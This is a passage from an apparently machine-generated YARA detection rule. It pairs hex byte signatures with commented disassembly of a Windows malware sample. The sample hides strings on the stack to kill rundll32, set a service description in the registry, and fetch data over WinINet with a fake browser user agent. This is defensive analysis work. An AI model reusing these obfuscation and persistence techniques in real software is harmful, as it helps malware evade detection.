        .text:0x00406db0           -35: int local35
        .text:0x00406db0           -36: int local36
        .text:0x00406db0           -37: int local37
        .text:0x00406db0           -38: int local38
        .text:0x00406db0           -39: int local39
        .text:0x00406db0           -40: int local40
        .text:0x00406db0           -41: int local41
        .text:0x00406db0           -42: int local42
        .text:0x00406db0           -43: int local43
        .text:0x00406db0           -44: int local44
        .text:0x00406db0           -45: int local45
        .text:0x00406db0           -46: int local46
        .text:0x00406db0           -47: int local47
        .text:0x00406db0           -48: int local48
        .text:0x00406db0           -49: int local49
        .text:0x00406db0           -50: int local50
        .text:0x00406db0           -51: int local51
        .text:0x00406db0           -52: int local52
        .text:0x00406db0  
        .text:0x00406db0  55               push ebp
        .text:0x00406db1  8bec             mov ebp,esp
        .text:0x00406db3  83ec30           sub esp,48
        .text:0x00406db6  53               push ebx
        .text:0x00406db7  56               push esi
        .text:0x00406db8  90               nop 
        .text:0x00406db9  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406dbf  6a00             push 0
        .text:0x00406dc1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406dc3  b36c             mov bl,108
        .text:0x00406dc5  6a00             push 0
        .text:0x00406dc7  c645f072         mov byte [ebp - 16],114
        .text:0x00406dcb  c645f175         mov byte [ebp - 15],117
        .text:0x00406dcf  c645f26e         mov byte [ebp - 14],110
        .text:0x00406dd3  c645f364         mov byte [ebp - 13],100
        .text:0x00406dd7  885df4           mov byte [ebp - 12],bl
        .text:0x00406dda  885df5           mov byte [ebp - 11],bl
        .text:0x00406ddd  c645f633         mov byte [ebp - 10],51
        .text:0x00406de1  c645f732         mov byte [ebp - 9],50
        .text:0x00406de5  c645f82e         mov byte [ebp - 8],46
        .text:0x00406de9  c645f965         mov byte [ebp - 7],101
        .text:0x00406ded  c645fa78         mov byte [ebp - 6],120
        .text:0x00406df1  c645fb65         mov byte [ebp - 5],101
        .text:0x00406df5  c645fc00         mov byte [ebp - 4],0
        .text:0x00406df9  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406dfb  6a00             push 0
        .text:0x00406dfd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406dff  90               nop 
        .text:0x00406e00  8d45f0           lea eax,dword [ebp - 16]
        .text:0x00406e03  50               push eax
        .text:0x00406e04  e8670b0000       call 0x00407970    ;sub_00407970(local20)
        .text:0x00406e09  83c404           add esp,4
        .text:0x00406e0c  85c0             test eax,eax
        .text:0x00406e0e  0f8496000000     jz 0x00406eaa
        */
        $c14 = { 55 8B EC 83 EC 30 53 56 90 8B 35 ?? ?? ?? ?? 6A 00 FF D6 B3 6C 6A 00 C6 45 ?? 72 C6 45 ?? 75 C6 45 ?? 6E C6 45 ?? 64 88 5D ?? 88 5D ?? C6 45 ?? 33 C6 45 ?? 32 C6 45 ?? 2E C6 45 ?? 65 C6 45 ?? 78 C6 45 ?? 65 C6 45 ?? 00 FF D6 6A 00 FF D6 90 8D 45 ?? 50 E8 ?? ?? ?? ?? 83 C4 04 85 C0 0F 84 ?? ?? ?? ?? }
        /*
Basic Block at 0x00406e14@9324d1a8ae37a36ae560c37448c9705a with 2 features:
          - contain obfuscated stackstrings
          - create process on Windows
        .text:0x00406e14  6a00             push 0
        .text:0x00406e16  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406e18  6a00             push 0
        .text:0x00406e1a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406e1c  90               nop 
        .text:0x00406e1d  b06b             mov al,107
        .text:0x00406e1f  b269             mov dl,105
        .text:0x00406e21  8845d3           mov byte [ebp - 45],al
        .text:0x00406e24  8845d4           mov byte [ebp - 44],al
        .text:0x00406e27  b020             mov al,32
        .text:0x00406e29  b12f             mov cl,47
        .text:0x00406e2b  6a00             push 0
        .text:0x00406e2d  c645d074         mov byte [ebp - 48],116
        .text:0x00406e31  c645d161         mov byte [ebp - 47],97
        .text:0x00406e35  c645d273         mov byte [ebp - 46],115
        .text:0x00406e39  8855d5           mov byte [ebp - 43],dl
        .text:0x00406e3c  885dd6           mov byte [ebp - 42],bl
        .text:0x00406e3f  885dd7           mov byte [ebp - 41],bl
        .text:0x00406e42  8845d8           mov byte [ebp - 40],al
        .text:0x00406e45  884dd9           mov byte [ebp - 39],cl
        .text:0x00406e48  c645da66         mov byte [ebp - 38],102
        .text:0x00406e4c  8845db           mov byte [ebp - 37],al
        .text:0x00406e4f  884ddc           mov byte [ebp - 36],cl
        .text:0x00406e52  8855dd           mov byte [ebp - 35],dl
        .text:0x00406e55  c645de6d         mov byte [ebp - 34],109
        .text:0x00406e59  8845df           mov byte [ebp - 33],al
        .text:0x00406e5c  c645e072         mov byte [ebp - 32],114
        .text:0x00406e60  c645e175         mov byte [ebp - 31],117
        .text:0x00406e64  c645e26e         mov byte [ebp - 30],110
        .text:0x00406e68  c645e364         mov byte [ebp - 29],100
        .text:0x00406e6c  885de4           mov byte [ebp - 28],bl
        .text:0x00406e6f  885de5           mov byte [ebp - 27],bl
        .text:0x00406e72  c645e633         mov byte [ebp - 26],51
        .text:0x00406e76  c645e732         mov byte [ebp - 25],50
        .text:0x00406e7a  c645e82e         mov byte [ebp - 24],46
        .text:0x00406e7e  c645e965         mov byte [ebp - 23],101
        .text:0x00406e82  c645ea78         mov byte [ebp - 22],120
        .text:0x00406e86  c645eb65         mov byte [ebp - 21],101
        .text:0x00406e8a  c645ec00         mov byte [ebp - 20],0
        .text:0x00406e8e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406e90  6a00             push 0
        .text:0x00406e92  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406e94  90               nop 
        .text:0x00406e95  6a00             push 0
        .text:0x00406e97  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406e99  90               nop 
        .text:0x00406e9a  8d4dd0           lea ecx,dword [ebp - 48]
        .text:0x00406e9d  6a00             push 0
        .text:0x00406e9f  51               push ecx
        .text:0x00406ea0  ff1530914000     call dword [0x00409130]    ;kernel32.WinExec(local52,0)
        .text:0x00406ea6  6a00             push 0
        .text:0x00406ea8  ffd6             call esi    ;kernel32.Sleep(0)
        */
        $c15 = { 6A 00 FF D6 6A 00 FF D6 90 B0 6B B2 69 88 45 ?? 88 45 ?? B0 20 B1 2F 6A 00 C6 45 ?? 74 C6 45 ?? 61 C6 45 ?? 73 88 55 ?? 88 5D ?? 88 5D ?? 88 45 ?? 88 4D ?? C6 45 ?? 66 88 45 ?? 88 4D ?? 88 55 ?? C6 45 ?? 6D 88 45 ?? C6 45 ?? 72 C6 45 ?? 75 C6 45 ?? 6E C6 45 ?? 64 88 5D ?? 88 5D ?? C6 45 ?? 33 C6 45 ?? 32 C6 45 ?? 2E C6 45 ?? 65 C6 45 ?? 78 C6 45 ?? 65 C6 45 ?? 00 FF D6 6A 00 FF D6 90 6A 00 FF D6 90 8D 4D ?? 6A 00 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 }
        /*
Basic Block at 0x0040730f@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x0040730f  loc_0040730f: [1 XREFS]
        .text:0x0040730f  53               push ebx
        .text:0x00407310  c645f425         mov byte [ebp - 12],37
        .text:0x00407314  c645f573         mov byte [ebp - 11],115
        .text:0x00407318  c645f600         mov byte [ebp - 10],0
        .text:0x0040731c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040731e  8d55f4           lea edx,dword [ebp - 12]
        .text:0x00407321  6818a24000       push 0x0040a218
        .text:0x00407326  52               push edx
        .text:0x00407327  6818a24000       push 0x0040a218
        .text:0x0040732c  e88f0b0000       call 0x00407ec0    ;msvcrt.sprintf(0x0040a218,local16)
        .text:0x00407331  83c40c           add esp,12
        .text:0x00407334  53               push ebx
        .text:0x00407335  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407337  53               push ebx
        .text:0x00407338  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040733a  53               push ebx
        .text:0x0040733b  c645e443         mov byte [ebp - 28],67
        .text:0x0040733f  c645e56f         mov byte [ebp - 27],111
        .text:0x00407343  c645e66e         mov byte [ebp - 26],110
        .text:0x00407347  c645e76e         mov byte [ebp - 25],110
        .text:0x0040734b  c645e865         mov byte [ebp - 24],101
        .text:0x0040734f  c645e963         mov byte [ebp - 23],99
        .text:0x00407353  c645ea74         mov byte [ebp - 22],116
        .text:0x00407357  c645eb47         mov byte [ebp - 21],71
        .text:0x0040735b  c645ec72         mov byte [ebp - 20],114
        .text:0x0040735f  c645ed6f         mov byte [ebp - 19],111
        .text:0x00407363  c645ee75         mov byte [ebp - 18],117
        .text:0x00407367  c645ef70         mov byte [ebp - 17],112
        .text:0x0040736b  c645f000         mov byte [ebp - 16],0
        .text:0x0040736f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407371  53               push ebx
        .text:0x00407372  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407374  53               push ebx
        .text:0x00407375  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407377  53               push ebx
        .text:0x00407378  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040737a  8d85acf8ffff     lea eax,dword [ebp - 1876]
        .text:0x00407380  6800040000       push 1024
        .text:0x00407385  8d4de4           lea ecx,dword [ebp - 28]
        .text:0x00407388  50               push eax
        .text:0x00407389  51               push ecx
        .text:0x0040738a  6818a24000       push 0x0040a218
        .text:0x0040738f  e8ccdbffff       call 0x00404f60    ;sub_00404f60(0x0040a218,local32,local1880,1024)
        .text:0x00407394  83c410           add esp,16
        .text:0x00407397  53               push ebx
        .text:0x00407398  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040739a  53               push ebx
        .text:0x0040739b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040739d  53               push ebx
        .text:0x0040739e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004073a0  8d95acf8ffff     lea edx,dword [ebp - 1876]
        .text:0x004073a6  52               push edx
        .text:0x004073a7  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(local1880)
        .text:0x004073ad  85c0             test eax,eax
        .text:0x004073af  751f             jnz 0x004073d0
        */
        $c16 = { 53 C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 00 FF D6 8D 55 ?? 68 18 A2 40 00 52 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 0C 53 FF D6 53 FF D6 53 C6 45 ?? 43 C6 45 ?? 6F C6 45 ?? 6E C6 45 ?? 6E C6 45 ?? 65 C6 45 ?? 63 C6 45 ?? 74 C6 45 ?? 47 C6 45 ?? 72 C6 45 ?? 6F C6 45 ?? 75 C6 45 ?? 70 C6 45 ?? 00 FF D6 53 FF D6 53 FF D6 53 FF D6 8D 85 ?? ?? ?? ?? 68 00 04 00 00 8D 4D ?? 50 51 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 10 53 FF D6 53 FF D6 53 FF D6 8D 95 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 85 C0 75 ?? }
        /*
Basic Block at 0x0040764a@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x0040764a  6a00             push 0
        .text:0x0040764c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040764e  b053             mov al,83
        .text:0x00407650  8885a4fcffff     mov byte [ebp - 860],al
        .text:0x00407656  c685a5fcffff59   mov byte [ebp - 859],89
        .text:0x0040765d  8885a6fcffff     mov byte [ebp - 858],al
        .text:0x00407663  c685a7fcffff54   mov byte [ebp - 857],84
        .text:0x0040766a  c685a8fcffff45   mov byte [ebp - 856],69
        .text:0x00407671  c685a9fcffff4d   mov byte [ebp - 855],77
        .text:0x00407678  b15c             mov cl,92
        .text:0x0040767a  888daafcffff     mov byte [ebp - 854],cl
        .text:0x00407680  b243             mov dl,67
        .text:0x00407682  8895abfcffff     mov byte [ebp - 853],dl
        .text:0x00407688  c685acfcffff75   mov byte [ebp - 852],117
        .text:0x0040768f  c685adfcffff72   mov byte [ebp - 851],114
        .text:0x00407696  c685aefcffff72   mov byte [ebp - 850],114
        .text:0x0040769d  b365             mov bl,101
        .text:0x0040769f  889daffcffff     mov byte [ebp - 849],bl
        .text:0x004076a5  c685b0fcffff6e   mov byte [ebp - 848],110
        .text:0x004076ac  c685b1fcffff74   mov byte [ebp - 847],116
        .text:0x004076b3  8895b2fcffff     mov byte [ebp - 846],dl
        .text:0x004076b9  c685b3fcffff6f   mov byte [ebp - 845],111
        .text:0x004076c0  c685b4fcffff6e   mov byte [ebp - 844],110
        .text:0x004076c7  c685b5fcffff74   mov byte [ebp - 843],116
        .text:0x004076ce  c685b6fcffff72   mov byte [ebp - 842],114
        .text:0x004076d5  c685b7fcffff6f   mov byte [ebp - 841],111
        .text:0x004076dc  c685b8fcffff6c   mov byte [ebp - 840],108
        .text:0x004076e3  8885b9fcffff     mov byte [ebp - 839],al
        .text:0x004076e9  889dbafcffff     mov byte [ebp - 838],bl
        .text:0x004076ef  c685bbfcffff74   mov byte [ebp - 837],116
        .text:0x004076f6  888dbcfcffff     mov byte [ebp - 836],cl
        .text:0x004076fc  8885bdfcffff     mov byte [ebp - 835],al
        .text:0x00407702  889dbefcffff     mov byte [ebp - 834],bl
        .text:0x00407708  c685bffcffff72   mov byte [ebp - 833],114
        .text:0x0040770f  c685c0fcffff76   mov byte [ebp - 832],118
        .text:0x00407716  c685c1fcffff69   mov byte [ebp - 831],105
        .text:0x0040771d  c685c2fcffff63   mov byte [ebp - 830],99
        .text:0x00407724  889dc3fcffff     mov byte [ebp - 829],bl
        .text:0x0040772a  c685c4fcffff73   mov byte [ebp - 828],115
        .text:0x00407731  888dc5fcffff     mov byte [ebp - 827],cl
        .text:0x00407737  c685c6fcffff00   mov byte [ebp - 826],0
        .text:0x0040773e  6a00             push 0
        .text:0x00407740  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407742  8d8da4fcffff     lea ecx,dword [ebp - 860]
        .text:0x00407748  51               push ecx
        .text:0x00407749  8d95e4feffff     lea edx,dword [ebp - 284]
        .text:0x0040774f  52               push edx
        .text:0x00407750  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407756  e815d0ffff       call 0x00404770    ;sub_00404770(local288,local864)
        .text:0x0040775b  6a00             push 0
        .text:0x0040775d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040775f  8b450c           mov eax,dword [ebp + 12]
        .text:0x00407762  50               push eax
        .text:0x00407763  8d8de4feffff     lea ecx,dword [ebp - 284]
        .text:0x00407769  51               push ecx
        .text:0x0040776a  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407770  e83bcfffff       call 0x004046b0    ;sub_004046b0(local288,arg1)
        .text:0x00407775  6a00             push 0
        .text:0x00407777  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407779  8d95dcfdffff     lea edx,dword [ebp - 548]
        .text:0x0040777f  52               push edx
        .text:0x00407780  8d85e4feffff     lea eax,dword [ebp - 284]
        .text:0x00407786  50               push eax
        .text:0x00407787  6802000080       push 0x80000002
        .text:0x0040778c  ff1520904000     call dword [0x00409020]    ;advapi32.RegOpenKeyA(0x80000002,local288,local552)
        .text:0x00407792  6a00             push 0
        .text:0x00407794  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407796  c68594fcffff44   mov byte [ebp - 876],68
        .text:0x0040779d  889d95fcffff     mov byte [ebp - 875],bl
        .text:0x004077a3  c68596fcffff73   mov byte [ebp - 874],115
        .text:0x004077aa  c68597fcffff63   mov byte [ebp - 873],99
        .text:0x004077b1  c68598fcffff72   mov byte [ebp - 872],114
        .text:0x004077b8  c68599fcffff69   mov byte [ebp - 871],105
        .text:0x004077bf  c6859afcffff70   mov byte [ebp - 870],112
        .text:0x004077c6  c6859bfcffff74   mov byte [ebp - 869],116
        .text:0x004077cd  c6859cfcffff69   mov byte [ebp - 868],105
        .text:0x004077d4  c6859dfcffff6f   mov byte [ebp - 867],111
        .text:0x004077db  c6859efcffff6e   mov byte [ebp - 866],110
        .text:0x004077e2  c6859ffcffff00   mov byte [ebp - 865],0
        .text:0x004077e9  6a00             push 0
        .text:0x004077eb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004077ed  8b5d14           mov ebx,dword [ebp + 20]
        .text:0x004077f0  53               push ebx
        .text:0x004077f1  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(arg3)
        .text:0x004077f7  50               push eax
        .text:0x004077f8  53               push ebx
        .text:0x004077f9  6a01             push 1
        .text:0x004077fb  6a00             push 0
        .text:0x004077fd  8d8d94fcffff     lea ecx,dword [ebp - 876]
        .text:0x00407803  51               push ecx
        .text:0x00407804  8b95dcfdffff     mov edx,dword [ebp - 548]
        .text:0x0040780a  52               push edx
        .text:0x0040780b  ff1500904000     call dword [0x00409000]    ;advapi32.RegSetValueExA(0,local880,0,1,arg3,kernel32.lstrlenA(arg3))
        .text:0x00407811  8b9dd4fcffff     mov ebx,dword [ebp - 812]
        */
        $c17 = { 6A 00 FF D6 B0 53 88 85 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 59 88 85 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 54 C6 85 ?? ?? ?? ?? 45 C6 85 ?? ?? ?? ?? 4D B1 5C 88 8D ?? ?? ?? ?? B2 43 88 95 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 75 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 72 B3 65 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 74 88 95 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 74 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6C 88 85 ?? ?? ?? ?? 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 74 88 8D ?? ?? ?? ?? 88 85 ?? ?? ?? ?? 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 76 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 63 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 73 88 8D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 00 6A 00 FF D6 8D 8D ?? ?? ?? ?? 51 8D 95 ?? ?? ?? ?? 52 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8B 45 ?? 50 8D 8D ?? ?? ?? ?? 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 68 02 00 00 80 FF 15 ?? ?? ?? ?? 6A 00 FF D6 C6 85 ?? ?? ?? ?? 44 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 73 C6 85 ?? ?? ?? ?? 63 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 74 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 00 6A 00 FF D6 8B 5D ?? 53 FF 15 ?? ?? ?? ?? 50 53 6A 01 6A 00 8D 8D ?? ?? ?? ?? 51 8B 95 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 8B 9D ?? ?? ?? ?? }
        /*
Basic Block at 0x00407b60@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00407b60  
        .text:0x00407b60  FUNC: int cdecl sub_00407b60( int arg0, int arg1, ) [2 XREFS] 
        .text:0x00407b60  
        .text:0x00407b60  Stack Variables: (offset from initial top of stack)
        .text:0x00407b60             8: int arg1
        .text:0x00407b60             4: int arg0
        .text:0x00407b60          -1024: int local1024
        .text:0x00407b60          -1028: int local1028
        .text:0x00407b60          -1032: int local1032
        .text:0x00407b60          -1036: int local1036
        .text:0x00407b60          -1040: int local1040
        .text:0x00407b60          -1044: int local1044
        .text:0x00407b60          -1048: int local1048
        .text:0x00407b60          -1052: int local1052
        .text:0x00407b60          -1053: int local1053
        .text:0x00407b60          -1054: int local1054
        .text:0x00407b60          -1055: int local1055
        .text:0x00407b60          -1056: int local1056
        .text:0x00407b60          -1057: int local1057
        .text:0x00407b60          -1058: int local1058
        .text:0x00407b60          -1059: int local1059
        .text:0x00407b60          -1060: int local1060
        .text:0x00407b60          -1061: int local1061
        .text:0x00407b60          -1062: int local1062
        .text:0x00407b60          -1063: int local1063
        .text:0x00407b60          -1064: int local1064
        .text:0x00407b60          -1065: int local1065
        .text:0x00407b60          -1066: int local1066
        .text:0x00407b60          -1067: int local1067
        .text:0x00407b60          -1068: int local1068
        .text:0x00407b60          -1069: int local1069
        .text:0x00407b60          -1070: int local1070
        .text:0x00407b60          -1071: int local1071
        .text:0x00407b60          -1072: int local1072
        .text:0x00407b60          -1073: int local1073
        .text:0x00407b60          -1074: int local1074
        .text:0x00407b60          -1075: int local1075
        .text:0x00407b60          -1076: int local1076
        .text:0x00407b60          -1080: int local1080
        .text:0x00407b60          -1081: int local1081
        .text:0x00407b60          -1082: int local1082
        .text:0x00407b60          -1083: int local1083
        .text:0x00407b60          -1084: int local1084
        .text:0x00407b60          -1085: int local1085
        .text:0x00407b60          -1086: int local1086
        .text:0x00407b60          -1087: int local1087
        .text:0x00407b60          -1088: int local1088
        .text:0x00407b60          -1089: int local1089
        .text:0x00407b60          -1090: int local1090
        .text:0x00407b60          -1091: int local1091
        .text:0x00407b60          -1092: int local1092
        .text:0x00407b60          -1093: int local1093
        .text:0x00407b60          -1094: int local1094
        .text:0x00407b60          -1095: int local1095
        .text:0x00407b60          -1096: int local1096
        .text:0x00407b60          -1097: int local1097
        .text:0x00407b60          -1098: int local1098
        .text:0x00407b60          -1099: int local1099
        .text:0x00407b60          -1100: int local1100
        .text:0x00407b60          -1101: int local1101
        .text:0x00407b60          -1102: int local1102
        .text:0x00407b60          -1103: int local1103
        .text:0x00407b60          -1104: int local1104
        .text:0x00407b60          -1105: int local1105
        .text:0x00407b60          -1106: int local1106
        .text:0x00407b60          -1107: int local1107
        .text:0x00407b60          -1108: int local1108
        .text:0x00407b60  
        .text:0x00407b60  81ec54040000     sub esp,1108
        .text:0x00407b66  53               push ebx
        .text:0x00407b67  b801000000       mov eax,1
        .text:0x00407b6c  55               push ebp
        .text:0x00407b6d  56               push esi
        .text:0x00407b6e  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00407b74  33ed             xor ebp,ebp
        .text:0x00407b76  89442450         mov dword [esp + 80],eax
        .text:0x00407b7a  8944244c         mov dword [esp + 76],eax
        .text:0x00407b7e  57               push edi
        .text:0x00407b7f  b06f             mov al,111
        .text:0x00407b81  b36c             mov bl,108
        .text:0x00407b83  55               push ebp
        .text:0x00407b84  896c2450         mov dword [esp + 80],ebp
        .text:0x00407b88  896c2460         mov dword [esp + 96],ebp
        .text:0x00407b8c  c64424344d       mov byte [esp + 52],77
        .text:0x00407b91  88442435         mov byte [esp + 53],al
        .text:0x00407b95  c64424367a       mov byte [esp + 54],122
        .text:0x00407b9a  c644243769       mov byte [esp + 55],105
        .text:0x00407b9f  885c2438         mov byte [esp + 56],bl
        .text:0x00407ba3  885c2439         mov byte [esp + 57],bl
        .text:0x00407ba7  c644243a61       mov byte [esp + 58],97
        .text:0x00407bac  c644243b2f       mov byte [esp + 59],47
        .text:0x00407bb1  c644243c34       mov byte [esp + 60],52
        .text:0x00407bb6  c644243d2e       mov byte [esp + 61],46
        .text:0x00407bbb  c644243e30       mov byte [esp + 62],48
        .text:0x00407bc0  c644243f20       mov byte [esp + 63],32
        .text:0x00407bc5  c644244028       mov byte [esp + 64],40
        .text:0x00407bca  c644244163       mov byte [esp + 65],99
        .text:0x00407bcf  88442442         mov byte [esp + 66],al
        .text:0x00407bd3  c64424436d       mov byte [esp + 67],109
        .text:0x00407bd8  c644244470       mov byte [esp + 68],112
        .text:0x00407bdd  c644244561       mov byte [esp + 69],97
        .text:0x00407be2  c644244674       mov byte [esp + 70],116
        .text:0x00407be7  c644244769       mov byte [esp + 71],105
        .text:0x00407bec  c644244862       mov byte [esp + 72],98
        .text:0x00407bf1  885c2449         mov byte [esp + 73],bl
        .text:0x00407bf5  c644244a65       mov byte [esp + 74],101
        .text:0x00407bfa  c644244b29       mov byte [esp + 75],41
        .text:0x00407bff  c644244c00       mov byte [esp + 76],0
        .text:0x00407c04  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c06  55               push ebp
        .text:0x00407c07  55               push ebp
        .text:0x00407c08  55               push ebp
        .text:0x00407c09  8d44243c         lea eax,dword [esp + 60]
        .text:0x00407c0d  55               push ebp
        .text:0x00407c0e  50               push eax
        .text:0x00407c0f  ff15e4914000     call dword [0x004091e4]    ;wininet.InternetOpenA(local1076,0,0,0,0)
        .text:0x00407c15  8bf8             mov edi,eax
        .text:0x00407c17  55               push ebp
        .text:0x00407c18  897c2464         mov dword [esp + 100],edi
        .text:0x00407c1c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c1e  3bfd             cmp edi,ebp
        .text:0x00407c20  750d             jnz 0x00407c2f
        */
        $c18 = { 81 EC 54 04 00 00 53 B8 01 00 00 00 55 56 8B 35 ?? ?? ?? ?? 33 ED 89 44 24 ?? 89 44 24 ?? 57 B0 6F B3 6C 55 89 6C 24 ?? 89 6C 24 ?? C6 44 24 ?? 4D 88 44 24 ?? C6 44 24 ?? 7A C6 44 24 ?? 69 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 61 C6 44 24 ?? 2F C6 44 24 ?? 34 C6 44 24 ?? 2E C6 44 24 ?? 30 C6 44 24 ?? 20 C6 44 24 ?? 28 C6 44 24 ?? 63 88 44 24 ?? C6 44 24 ?? 6D C6 44 24 ?? 70 C6 44 24 ?? 61 C6 44 24 ?? 74 C6 44 24 ?? 69 C6 44 24 ?? 62 88 5C 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 29 C6 44 24 ?? 00 FF D6 55 55 55 8D 44 24 ?? 55 50 FF 15 ?? ?? ?? ?? 8B F8 55 89 7C 24 ?? FF D6 3B FD 75 ?? }
        /*
Basic Block at 0x00407c64@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00407c64  loc_00407c64: [1 XREFS]
        .text:0x00407c64  8b94246c040000   mov edx,dword [esp + 1132]
        .text:0x00407c6b  6a00             push 0
        .text:0x00407c6d  6a00             push 0
        .text:0x00407c6f  6a02             push 2
        .text:0x00407c71  6a00             push 0
        .text:0x00407c73  6a00             push 0
        .text:0x00407c75  6800000040       push 0x40000000
        .text:0x00407c7a  52               push edx
        .text:0x00407c7b  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(arg1,0x40000000,0,0,2,0,0)
        .text:0x00407c81  8be8             mov ebp,eax
        .text:0x00407c83  b049             mov al,73
        .text:0x00407c85  b14e             mov cl,78
        .text:0x00407c87  88442411         mov byte [esp + 17],al
        .text:0x00407c8b  88442413         mov byte [esp + 19],al
        .text:0x00407c8f  8844241c         mov byte [esp + 28],al
        .text:0x00407c93  884c2412         mov byte [esp + 18],cl
        .text:0x00407c97  884c2414         mov byte [esp + 20],cl
        .text:0x00407c9b  b06e             mov al,110
        .text:0x00407c9d  b164             mov cl,100
        .text:0x00407c9f  8844241d         mov byte [esp + 29],al
        .text:0x00407ca3  88442421         mov byte [esp + 33],al
        .text:0x00407ca7  884c2418         mov byte [esp + 24],cl
        .text:0x00407cab  884c2427         mov byte [esp + 39],cl
        .text:0x00407caf  8d44241c         lea eax,dword [esp + 28]
        .text:0x00407cb3  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00407cb7  50               push eax
        .text:0x00407cb8  51               push ecx
        .text:0x00407cb9  c644241857       mov byte [esp + 24],87
        .text:0x00407cbe  c644241d45       mov byte [esp + 29],69
        .text:0x00407cc3  c644241e54       mov byte [esp + 30],84
        .text:0x00407cc8  c644241f2e       mov byte [esp + 31],46
        .text:0x00407ccd  885c2421         mov byte [esp + 33],bl
        .text:0x00407cd1  885c2422         mov byte [esp + 34],bl
        .text:0x00407cd5  c644242300       mov byte [esp + 35],0
        .text:0x00407cda  c644242674       mov byte [esp + 38],116
        .text:0x00407cdf  c644242765       mov byte [esp + 39],101
        .text:0x00407ce4  c644242872       mov byte [esp + 40],114
        .text:0x00407ce9  c644242a65       mov byte [esp + 42],101
        .text:0x00407cee  c644242b74       mov byte [esp + 43],116
        .text:0x00407cf3  c644242c52       mov byte [esp + 44],82
        .text:0x00407cf8  c644242d65       mov byte [esp + 45],101
        .text:0x00407cfd  c644242e61       mov byte [esp + 46],97
        .text:0x00407d02  c644243046       mov byte [esp + 48],70
        .text:0x00407d07  c644243169       mov byte [esp + 49],105
        .text:0x00407d0c  885c2432         mov byte [esp + 50],bl
        .text:0x00407d10  c644243365       mov byte [esp + 51],101
        .text:0x00407d15  c644243400       mov byte [esp + 52],0
        .text:0x00407d1a  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local1108)
        .text:0x00407d20  50               push eax
        .text:0x00407d21  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(wininet,local1096)
        .text:0x00407d27  83fdff           cmp ebp,0xffffffff
        .text:0x00407d2a  8bd8             mov ebx,eax
        .text:0x00407d2c  747f             jz 0x00407dad
        */
